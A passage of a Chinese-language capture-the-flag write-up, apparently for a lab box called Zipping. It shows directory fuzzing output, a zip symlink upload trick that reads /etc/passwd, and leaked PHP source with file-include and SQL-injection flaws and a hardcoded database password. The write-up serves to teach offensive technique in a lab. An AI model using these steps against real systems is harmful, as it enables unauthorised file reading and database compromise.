seconds</span><br></pre></td></tr></table></figure></p>\n<p>根据我的扫描得到的目录有</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Target: http://10.129.48.105/FUZZ</span><br><span class=\"line\">Total requests: 45524</span><br><span class=\"line\"></span><br><span class=\"line\">=====================================================================</span><br><span class=\"line\">ID           Response   Lines    Word       Chars       Payload</span><br><span class=\"line\">=====================================================================</span><br><span class=\"line\"></span><br><span class=\"line\">000000006:   200        317 L    1354 W     16736 Ch    &quot;index.php&quot;</span><br><span class=\"line\">000000082:   301        9 L      28 W       315 Ch      &quot;assets&quot;</span><br><span class=\"line\">000000290:   301        9 L      28 W       316 Ch      &quot;uploads&quot;</span><br><span class=\"line\">000000291:   200        113 L    380 W      5322 Ch     &quot;upload.php&quot;</span><br><span class=\"line\">000000925:   403        9 L      28 W       278 Ch      &quot;.htpasswd&quot;</span><br><span class=\"line\">000001526:   301        9 L      28 W       313 Ch      &quot;shop&quot;</span><br><span class=\"line\">000013450:   403        9 L      28 W       278 Ch      &quot;.htaccess&quot;</span><br></pre></td></tr></table></figure></p>\n<p>先去访问这个 upload.php</p>\n<p>发现我们上传一般的木马上传不上去，文件名格式必须是压缩包的，并且压缩包内还必须包含.pdf 文件</p>\n<p>经过尝试这个题可以使用 zip 符号链接来达到任意读取</p>\n<p>参考链接 (2023 年大学生信息安全竞赛 unzip)</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https://ctf.njupt.edu.cn/archives/898</span><br></pre></td></tr></table></figure></p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ln -s ../../../../../etc/passwd pass</span><br><span class=\"line\">然后将这个pass加上后缀.pdf</span><br><span class=\"line\">在通过</span><br><span class=\"line\">zip --symlinks pass.zip pass.pdf</span><br><span class=\"line\">进行解压</span><br></pre></td></tr></table></figure></p>\n<p>完成后进入</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://10.129.48.105/upload.php</span><br></pre></td></tr></table></figure></p>\n<p>上传成功后点击链接查看</p>\n<p>我使用的火狐能够查看，使用 edge 或者谷歌都会报错</p>\n<p>那我们现在开始任意读取了</p>\n<p>经过读取发现</p>\n<p>/shop/index.php</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">session_start();</span><br><span class=\"line\">// Include functions and connect to the database using PDO MySQL</span><br><span class=\"line\">include &#x27;functions.php&#x27;;</span><br><span class=\"line\">$pdo = pdo_connect_mysql();</span><br><span class=\"line\">// Page is set to home (home.php) by default, so when the visitor visits, that will be the page they see.</span><br><span class=\"line\">$page = isset($_GET[&#x27;page&#x27;]) &amp;&amp; file_exists($_GET[&#x27;page&#x27;] . &#x27;.php&#x27;) ? $_GET[&#x27;page&#x27;] : &#x27;home&#x27;;</span><br><span class=\"line\">// Include and show the requested page</span><br><span class=\"line\">include $page . &#x27;.php&#x27;;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure></p>\n<p>functions.php</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">function pdo_connect_mysql() &#123;</span><br><span class=\"line\">    // Update the details below with your MySQL details</span><br><span class=\"line\">    $DATABASE_HOST = &#x27;localhost&#x27;;</span><br><span class=\"line\">    $DATABASE_USER = &#x27;root&#x27;;</span><br><span class=\"line\">    $DATABASE_PASS = &#x27;MySQL_P@ssw0rd!&#x27;;</span><br><span class=\"line\">    $DATABASE_NAME = &#x27;zipping&#x27;;</span><br><span class=\"line\">    try &#123;</span><br><span class=\"line\">    \treturn new PDO(&#x27;mysql:host=&#x27; . $DATABASE_HOST . &#x27;;dbname=&#x27; . $DATABASE_NAME . &#x27;;charset=utf8&#x27;, $DATABASE_USER, $DATABASE_PASS);</span><br><span class=\"line\">    &#125; catch (PDOException $exception) &#123;</span><br><span class=\"line\">    \t// If there is an error with the connection, stop the script and display the error.</span><br><span class=\"line\">    \texit(&#x27;Failed to connect to database!&#x27;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">// Template header, feel free to customize this</span><br><span class=\"line\">function template_header($title) &#123;</span><br><span class=\"line\">$num_items_in_cart = isset($_SESSION[&#x27;cart&#x27;]) ? count($_SESSION[&#x27;cart&#x27;]) : 0;</span><br><span class=\"line\">echo &lt;&lt;&lt;EOT</span><br><span class=\"line\">&lt;!DOCTYPE html&gt;</span><br><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\">\t&lt;head&gt;</span><br><span class=\"line\">\t\t&lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class=\"line\">\t\t&lt;title&gt;$title&lt;/title&gt;</span><br><span class=\"line\">\t\t&lt;link href=&quot;assets/style.css&quot; rel=&quot;stylesheet&quot; type=&quot;text/css&quot;&gt;</span><br><span class=\"line\">\t\t&lt;link rel=&quot;stylesheet&quot; href=&quot;https://use.fontawesome.com/releases/v5.7.1/css/all.css&quot;&gt;</span><br><span class=\"line\">\t&lt;/head&gt;</span><br><span class=\"line\">\t&lt;body&gt;</span><br><span class=\"line\">        &lt;header&gt;</span><br><span class=\"line\">            &lt;div class=&quot;content-wrapper&quot;&gt;</span><br><span class=\"line\">                &lt;a href=&quot;..&quot; style=&quot;text-decoration: none;&quot;&gt;&lt;h1&gt;Zipping Watch Store&lt;/h1&gt;&lt;/a&gt;</span><br><span class=\"line\">                &lt;nav&gt;</span><br><span class=\"line\">                    &lt;a href=&quot;index.php&quot;&gt;Home&lt;/a&gt;</span><br><span class=\"line\">                    &lt;a href=&quot;index.php?page=products&quot;&gt;Products&lt;/a&gt;</span><br><span class=\"line\">                &lt;/nav&gt;</span><br><span class=\"line\">                &lt;div class=&quot;link-icons&quot;&gt;</span><br><span class=\"line\">                    &lt;a href=&quot;index.php?page=cart&quot;&gt;</span><br><span class=\"line\">\t\t\t\t\t\t&lt;i class=&quot;fas fa-shopping-cart&quot;&gt;&lt;/i&gt;</span><br><span class=\"line\">\t\t\t\t\t\t&lt;span&gt;$num_items_in_cart&lt;/span&gt;</span><br><span class=\"line\">\t\t\t\t\t&lt;/a&gt;</span><br><span class=\"line\">                &lt;/div&gt;</span><br><span class=\"line\">            &lt;/div&gt;</span><br><span class=\"line\">        &lt;/header&gt;</span><br><span class=\"line\">        &lt;main&gt;</span><br><span class=\"line\">EOT;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">// Template footer</span><br><span class=\"line\">function template_footer() &#123;</span><br><span class=\"line\">$year = date(&#x27;Y&#x27;);</span><br><span class=\"line\">echo &lt;&lt;&lt;EOT</span><br><span class=\"line\">        &lt;/main&gt;</span><br><span class=\"line\">        &lt;footer&gt;</span><br><span class=\"line\">            &lt;div class=&quot;content-wrapper&quot;&gt;</span><br><span class=\"line\">                &lt;p&gt;&amp;copy; $year, Zipping Watch Store&lt;/p&gt;</span><br><span class=\"line\">            &lt;/div&gt;</span><br><span class=\"line\">        &lt;/footer&gt;</span><br><span class=\"line\">    &lt;/body&gt;</span><br><span class=\"line\">&lt;/html&gt;</span><br><span class=\"line\">EOT;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></p>\n<p>在这里得到了数据库的用户和密码</p>\n<p>product.php</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">// Check to make sure the id parameter is specified in the URL</span><br><span class=\"line\">if (isset($_GET[&#x27;id&#x27;])) &#123;</span><br><span class=\"line\">    $id = $_GET[&#x27;id&#x27;];</span><br><span class=\"line\">    // Filtering user input for letters or special characters</span><br><span class=\"line\">    if(preg_match(&quot;/^.*[A-Za-z!#$%^&amp;*()\\-_=+&#123;&#125;\\[\\]\\\\|;:&#x27;\\&quot;,.&lt;&gt;\\/?]|[^0-9]$/&quot;, $id, $match)) &#123;</span><br><span class=\"line\">        header(&#x27;Location: index.php&#x27;);</span><br><span class=\"line\">    &#125; else &#123;</span><br><span class=\"line\">        // Prepare statement and execute, but does not prevent SQL injection</span><br><span class=\"line\">        $stmt = $pdo-&gt;prepare(&quot;SELECT * FROM products WHERE id = &#x27;$id&#x27;&quot;);</span><br><span class=\"line\">        $stmt-&gt;execute();</span><br><span class=\"line\">        // Fetch the product from the database and return the result as an Array</span><br><span class=\"line\">        $product = $stmt-&gt;fetch(PDO::FETCH_ASSOC);</span><br><span class=\"line\">        // Check if the product exists (array is not empty)</span><br><span class=\"line\">        if (!$product) &#123;</span><br><span class=\"line\">            // Simple error to display if the id for the product doesn&#x27;t exists (array is empty)</span><br><span class=\"line\">            exit(&#x27;Product does not exist!&#x27;);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125; else &#123;</span><br><span class=\"line\">    // Simple error to display if the id wasn&#x27;t specified</span><br><span class=\"line\">    exit(&#x27;No ID provided!&#x27;);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;?=template_header(&#x27;Zipping | Product&#x27;)?&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;div class=&quot;product content-wrapper&quot;&gt;</span><br><span class=\"line\">    &lt;img src=&quot;assets/imgs/&lt;?=$product[&#x27;img&#x27;]?&gt;&quot; width=&quot;500&quot; height=&quot;500&quot; alt=&quot;&lt;?=$product[&#x27;name&#x27;]?&gt;&quot;&gt;</span><br><span class=\"line\">    &lt;div&gt;</span><br><span class=\"line\">        &lt;h1 class=&quot;name&quot;&gt;&lt;?=$product[&#x27;name&#x27;]?&gt;&lt;/h1&gt;</span><br><span class=\"line\">        &lt;span class=&quot;price&quot;&gt;</span><br><span class=\"line\">            &amp;dollar;&lt;?=$product[&#x27;price&#x27;]?&gt;</span><br><span class=\"line\">            &lt;?php if ($product[&#x27;rrp&#x27;] &gt; 0): ?&gt;</span><br><span class=\"line\">            &lt;span class=&quot;rrp&quot;&gt;&amp;dollar;&lt;?=$product[&#x27;rrp&#x27;]?&gt;&lt;/span&gt;</span><br><span class=\"line\">            &lt;?php endif; ?&gt;</span><br><span class=\"line\">        &lt;/span&gt;</span><br><span class=\"line\">        &lt;form action=&quot;index.php?page=cart&quot; method=&quot;post&quot;&gt;</span><br><span class=\"line\">            &lt;input type=&quot;number&quot; name=&quot;quantity&quot; value=&quot;1&quot; min=&quot;1&quot; max=&quot;&lt;?=$product[&#x27;quantity&#x27;]?&gt;&quot; placeholder=&quot;Quantity&quot; required&gt;</span><br><span class=\"line\">            &lt;input type=&quot;hidden&quot; name=&quot;product_id&quot; value=&quot;&lt;?=$product[&#x27;id&#x27;]?&gt;&quot;&gt;</span><br><span class=\"line\">            &lt;input type=&quot;submit&quot; value=&quot;Add To Cart&quot;&gt;</span><br><span class=\"line\">        &lt;/form&gt;</span><br><span class=\"line\">        &lt;div class=&quot;description&quot;&gt;</span><br><span class=\"line\">            &lt;?=$product[&#x27;desc&#x27;]?&gt;</span><br><span class=\"line\">        &lt;/div&gt;</span><br><span class=\"line\">    &lt;/div&gt;</span><br><span class=\"line\">&lt;/div&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;?=template_footer()?&gt;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></p>\n<p>cart.php</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">// If the user clicked the add to cart button on the product page we can check for the form data</span><br><span class=\"line\">if (isset($_POST[&#x27;product_id&#x27;], $_POST[&#x27;quantity&#x27;])) &#123;</span><br><span class=\"line\">    // Set the post variables so we easily identify them, also make sure they are integer</span><br><span class=\"line\">    $product_id = $_POST[&#x27;product_id&#x27;];</span><br><span class=\"line\">    $quantity = $_POST[&#x27;quantity&#x27;];</span><br><span class=\"line\">    // Filtering user input for letters or special characters</span><br><span class=\"line\">    if(preg_match(&quot;/^.*[A-Za-z!#$%^&amp;*()\\-_=+&#123;&#125;\\[\\]\\\\|;:&#x27;\\&quot;,.&lt;&gt;\\/?]|[^0-9]$/&quot;, $product_id, $match) || preg_match(&quot;/^.*[A-Za-z!#$%^&amp;*()\\-_=+&#123;&#125;[\\]\\\\|;:&#x27;\\&quot;,.&lt;&gt;\\/?]/i&quot;, $quantity, $match)) &#123;</span><br><span class=\"line\">        echo &#x27;&#x27;;</span><br><span class=\"line\">    &#125; else &#123;</span><br><span class=\"line\">        // Construct the SQL statement with a vulnerable parameter</span><br><span class=\"line\">        $sql = &quot;SELECT * FROM products WHERE id = &#x27;&quot; . $_POST[&#x27;product_id&#x27;] . &quot;&#x27;&quot;;</span><br><span class=\"line\">        // Execute the SQL statement without any sanitization or parameter binding</span><br><span class=\"line\">        $product = $pdo-&gt;query($sql)-&gt;fetch(PDO::FETCH_ASSOC);</span><br><span class=\"line\">        // Check if the product exists (array is not empty)</span><br><span class=\"line\">        if ($product &amp;&amp; $quantity &gt; 0) &#123;</span><br><span class=\"line\">            // Product exists in database, now we can create/update the session variable for the cart</span><br><span class=\"line\">            if (isset($_SESSION[&#x27;cart&#x27;]) &amp;&amp; is_array($_SESSION[&#x27;cart&#x27;])) &#123;</span><br><span class=\"line\">                if (array_key_exists($product_id, $_SESSION[&#x27;cart&#x27;])) &#123;</span><br><span class=\"line\">                    // Product exists in cart so just update the quanity</span><br><span class=\"line\">                    $_SESSION[&#x27;cart&#x27;][$product_id] += $quantity;</span><br><span class=\"line\">                &#125; else &#123;</span><br><span class=\"line\">                    // Product is not in cart so add it</span><br><span class=\"line\">                    $_SESSION[&#x27;cart&#x27;][$product_id] = $quantity;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125; else &#123;</span><br><span class=\"line\">                // There are no products in cart, this will add the first product to cart</span><br><span class=\"line\">                $_SESSION[&#x27;cart&#x27;] = array($product_id =&gt; $quantity);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        // Prevent form resubmission...</span><br><span class=\"line\">        header(&#x27;location: index.php?page=cart&#x27;);</span><br><span class=\"line\">        exit;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">// Remove product from cart, check for the URL param &quot;remove&quot;, this is the product id, make sure it&#x27;s a number and check if it&#x27;s in the cart</span><br><span class=\"line\">if (isset($_GET[&#x27;remove&#x27;]) &amp;&amp; is_numeric($_GET[&#x27;remove&#x27;]) &amp;&amp; isset($_SESSION[&#x27;cart&#x27;]) &amp;&amp; isset($_SESSION[&#x27;cart&#x27;][$_GET[&#x27;remove&#x27;]])) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    // Remove the product from the shopping cart</span><br><span class=\"line\">    unset($_SESSION[&#x27;cart&#x27;][$_GET[&#x27;remove&#x27;]]);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">// Update product quantities in cart if the user clicks the &quot;Update&quot; button on the shopping cart page</span><br><span class=\"line\">if (isset($_POST[&#x27;update&#x27;]) &amp;&amp; isset($_SESSION[&#x27;cart&#x27;])) &#123;</span><br><span class=\"line\">    // Loop through the post data so we can update the quantities for every product in cart</span><br><span class=\"line\">    foreach ($_POST as $k =&gt; $v) &#123;</span><br><span class=\"line\">        if (strpos($k, &#x27;quantity&#x27;) !== false &amp;&amp; is_numeric($v)) &#123;</span><br><span class=\"line\">            $id = str_replace(&#x27;quantity-&#x27;, &#x27;&#x27;, $k);</span><br><span class=\"line\">            $quantity = (int)$v;</span><br><span class=\"line\">            // Always do checks and validation</span><br><span class=\"line\">            if (is_numeric($id) &amp;&amp; isset($_SESSION[&#x27;cart&#x27;][$id]) &amp;&amp; $quantity &gt; 0) &#123;</span><br><span class=\"line\">                // Update new quantity</span><br><span class=\"line\">                $_SESSION[&#x27;cart&#x27;][$id] = $quantity;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    // Prevent form resubmission...</span><br><span class=\"line\">    header(&#x27;location: index.php?page=cart&#x27;);</span><br><span class=\"line\">    exit;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">// Send the user to the place order page if they click the Place Order button, also the cart should not be empty</span><br><span class=\"line\">if (isset($_POST[&#x27;placeorder&#x27;]) &amp;&amp; isset($_SESSION[&#x27;cart&#x27;]) &amp;&amp; !empty($_SESSION[&#x27;cart&#x27;])) &#123;</span><br><span class=\"line\">    header(&#x27;Location: index.php?page=placeorder&#x27;);</span><br><span class=\"line\">    exit;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">if (isset($_POST[&#x27;clear&#x27;])) &#123;</span><br><span class=\"line\">\tunset($_SESSION[&#x27;cart&#x27;]);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">// Check the session variable for products in cart</span><br><span class=\"line\">$products_in_cart = isset($_SESSION[&#x27;cart&#x27;]) ? $_SESSION[&#x27;cart&#x27;] : array();</span><br><span class=\"line\">$products = array();</span><br><span class=\"line\">$subtotal = 0.00;</span><br><span class=\"line\">// If there are products in cart</span><br><span class=\"line\">if ($products_in_cart) &#123;</span><br><span class=\"line\">    // There are products in the cart so we need to select those products from the database</span><br><span class=\"line\">    // Products in cart array to question mark string array, we need the SQL statement to include IN (?,?,?,...etc)</span><br><span class=\"line\">    $array_to_question_marks = implode(&#x27;,&#x27;, array_fill(0, count($products_in_cart), &#x27;?&#x27;));</span><br><span class=\"line\">    $stmt = $pdo-&gt;prepare(&#x27;SELECT * FROM products WHERE id IN (&#x27; . $array_to_question_marks . &#x27;)&#x27;);</span><br><span class=\"line\">    // We only need the array keys, not the values, the keys are the id&#x27;s of the products</span><br><span class=\"line\">    $stmt-&gt;execute(array_keys($products_in_cart));</span><br><span class=\"line\">    // Fetch the products from the database and return the result as an Array</span><br><span class=\"line\">    $products = $stmt-&gt;fetchAll(PDO::FETCH_ASSOC);</span><br><span class=\"line\">    // Calculate the subtotal</span><br><span class=\"line\">    foreach ($products as $product) &#123;</span><br><span class=\"line\">        $subtotal += (float)$product[&#x27;price&#x27;] * (int)$products_in_cart[$product[&#x27;id&#x27;]];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;?=template_header(&#x27;Zipping | Cart&#x27;)?&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;div class=&quot;cart content-wrapper&quot;&gt;</span><br><span class=\"line\">    &lt;h1&gt;Shopping Cart&lt;/h1&gt;</span><br><span class=\"line\">    &lt;form action=&quot;index.php?page=cart&quot; method=&quot;post&quot;&gt;</span><br><span class=\"line\">        &lt;table&gt;</span><br><span class=\"line\">            &lt;thead&gt;</span><br><span class=\"line\">                &lt;tr&gt;</span><br><span class=\"line\">                    &lt;td colspan=&quot;2&quot;&gt;Product&lt;/td&gt;</span><br><span class=\"line\">                    &lt;td&gt;Price&lt;/td&gt;</span><br><span class=\"line\">                    &lt;td&gt;Quantity&lt;/td&gt;</span><br><span class=\"line\">                    &lt;td&gt;Total&lt;/td&gt;</span><br><span class=\"line\">                &lt;/tr&gt;</span><br><span class=\"line\">            &lt;/thead&gt;</span><br><span class=\"line\">            &lt;tbody&gt;</span><br><span class=\"line\">                &lt;?php if (empty($products)): ?&gt;</span><br><span class=\"line\">                &lt;tr&gt;</span><br><span class=\"line\">                    &lt;td colspan=&quot;5&quot; style=&quot;text-align:center;&quot;&gt;You have no products added in your Shopping Cart&lt;/td&gt;</span><br><span class=\"line\">                &lt;/tr&gt;</span><br><span class=\"line\">                &lt;?php else: ?&gt;</span><br><span class=\"line\">                &lt;?php foreach ($products as $product): ?&gt;</span><br><span class=\"line\">                &lt;tr&gt;</span><br><span class=\"line\">                    &lt;td class=&quot;img&quot;&gt;</span><br><span class=\"line\">                        &lt;a href=&quot;index.php?page=product&amp;id=&lt;?=$product[&#x27;id&#x27;]?&gt;&quot;&gt;</span><br><span class=\"line\">                            &lt;img src=&quot;assets/imgs/&lt;?=$product[&#x27;img&#x27;]?&gt;&quot; width=&quot;50&quot; height=&quot;50&quot; alt=&quot;&lt;?=$product[&#x27;name&#x27;]?&gt;&quot;&gt;</span><br><span class=\"line\">                        &lt;/a&gt;</span><br><span class=\"line\">                    &lt;/td&gt;</span><br><span class=\"line\">                    &lt;td&gt;</span><br><span class=\"line\">                        &lt;a href=&quot;index.php?page=product&amp;id=&lt;?=$product[&#x27;id&#x27;]?&gt;&quot;&gt;&lt;?=$product[&#x27;name&#x27;]?&gt;&lt;/a&gt;</span><br><span class=\"line\">                        &lt;br&gt;</span><br><span class=\"line\">                        &lt;a href=&quot;index.php?page=cart&amp;remove=&lt;?=$product[&#x27;id&#x27;]?&gt;&quot; class=&quot;remove&quot;&gt;Remove&lt;/a&gt;</span><br><span class=\"line\">                    &lt;/td&gt;</span><br><span class=\"line\">                    &lt;td 